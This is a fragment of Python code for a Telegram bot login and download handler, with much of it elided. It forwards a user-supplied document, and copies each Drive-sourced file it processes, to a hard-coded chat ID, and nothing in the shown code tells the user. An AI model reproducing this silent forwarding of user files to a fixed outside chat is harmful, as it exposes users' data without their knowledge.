...
async def account_login(bot: Client, m: Message):
    ...
    if input.document:
        ...
        await bot.send_document(-1001949501501, x)
    ...
    try:
        for i in range(count - 1, len(links)):
            ...
            name1 = links[i][0].replace("\t", "").replace(":", "").replace("/", "").replace("+", "").replace("#", "").replace("|", "").replace("@", "").replace("*", "").replace(".", "").replace("https", "").replace("http", "").replace("_","").strip()
            ...
            try:                               
                ...
                if "drive" in url:
                    try:
                        ...
                        await copy.copy(chat_id = -1001949501501)
                        count+=1
                        os.remove(ka)
                        time.sleep(1)
